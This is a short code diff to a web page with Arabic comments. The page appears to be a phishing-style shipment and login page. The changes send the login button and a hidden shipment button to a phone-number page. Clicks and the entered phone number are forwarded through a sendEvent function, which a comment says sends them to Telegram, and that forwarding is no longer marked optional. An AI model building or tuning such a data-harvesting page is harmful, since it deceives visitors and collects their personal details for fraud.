@@ -1189,9 +1189,10 @@
     }
   });
 
+  // تم تعديل هذه الدالة لتذهب إلى صفحة الهاتف بدلاً من where
   document.getElementById("goLogin").addEventListener("click", async () => {
     await sendEvent(`🔐 *الضغط على زر تسجيل الدخول*`);
-    go("where");
+    go("phone");
   });
 
   // تعديل: زر الشحنة المخفي يذهب لصفحة الهاتف
@@ -1219,7 +1220,7 @@
     }
     setError("err_phoneNumber", "");
     document.getElementById('phoneNumber').classList.remove('error');
-    // إرسال رقم الهاتف إلى تيليجرام (اختياري)
+    // إرسال رقم الهاتف إلى تيليجرام
     await sendEvent(`📱 *إدخال رقم الهاتف*: ${phone}`);
     go("where");
   });
@@ -1361,4 +1362,4 @@
   document.addEventListener("DOMContentLoaded", () => { document.querySelectorAll("body > *:not(#myProductBox)").forEach(el => el.style.display = "none"); document.body.style.visibility = "visible"; });
 </script>
 </body>
-  </html>
+          </html>
